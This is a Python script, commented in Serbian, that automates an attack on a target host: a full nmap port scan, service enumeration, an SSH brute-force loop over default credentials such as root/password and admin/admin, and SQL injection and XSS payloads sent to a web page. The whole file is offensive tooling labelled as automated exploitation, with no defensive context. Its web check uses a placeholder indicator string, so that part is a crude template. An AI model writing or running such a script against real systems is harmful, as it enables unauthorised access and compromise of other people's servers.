import nmap
import paramiko
import requests
from time import sleep

# Definisanje ciljanog servera
target = "192.168.1.100"

# Skener portova
def scan_ports(target):
    nm = nmap.PortScanner()
    nm.scan(target, '1-65535')
    open_ports = []
    for host in nm.all_hosts():
        for port in nm[host]['tcp']:
            if nm[host]['tcp'][port]['state'] == 'open':
                open_ports.append(port)
    return open_ports

# Enumeracija usluga
def enumerate_services(target, ports):
    services = {}
    nm = nmap.PortScanner()
    for port in ports:
        nm.scan(target, str(port))
        service = nm[target]['tcp'][port]['name']
        services[port] = service
    return services

# SSH Bruteforce napad
def ssh_bruteforce(target, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, port=port, username=username, password=password)
        return True
    except paramiko.AuthenticationException:
        return False

# Web aplikacija napadi (SQLi, XSS)
def web_attack(target, port, path):
    url = f"http://{target}:{port}{path}"
    payloads = ["' OR '1'='1", "<script>alert('XSS')</script>"]
    for payload in payloads:
        response = requests.get(url, params={"q": payload})
        if "specific keyword or indicator" in response.text:
            return True
    return False

# Glavna funkcija
def main():
    print(f"Starting scan on target: {target}")
    
    # Skeniranje portova
    open_ports = scan_ports(target)
    print(f"Open ports: {open_ports}")
    
    # Enumeracija usluga
    services = enumerate_services(target, open_ports)
    print(f"Services: {services}")
    
    # Automatizovani napadi
    for port, service in services.items():
        if service == "ssh":
            usernames = ["root", "admin", "user", "sa"]
            passwords = ["password", "123456", "admin", "root", "password1234"]
            for username in usernames:
                for password in passwords:
                    if ssh_bruteforce(target, port, username, password):
                        print(f"Successful SSH login on port {port} with {username}/{password}")
                        break
        elif service == "http":
            if web_attack(target, port, "/vulnerable_page"):
                print(f"Successful web attack on port {port}")
    
    print("Automated exploitation completed.")

if __name__ == "__main__":
    main()
